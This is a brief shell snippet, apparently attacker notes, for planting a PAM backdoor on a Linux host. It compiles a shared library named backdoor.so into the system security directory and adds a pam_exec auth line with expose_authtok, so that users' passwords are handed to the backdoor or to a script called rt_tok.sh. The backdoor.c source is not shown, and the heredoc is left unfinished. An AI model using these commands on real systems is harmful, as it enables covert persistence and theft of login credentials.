apt-get install libpam0g-dev
mkdir -p /lib/security
gcc -fPIC -shared -o /lib/security/backdoor.so backdoor.c -lpam -lpam_misc

# mkdir -p /usr/lib/x86_64-linux-gnu/security/
# cat <<- 'EOF' > /usr/lib/x86_64-linux-gnu/security/rt_tok.sh
auth sufficient pam_exec.so debug expose_authtok /usr/lib/x86_64-linux-gnu/security/backdoor.so

# auth sufficient pam_exec.so debug expose_authtok /usr/lib/x86_64-linux-gnu/security/rt_tok.sh
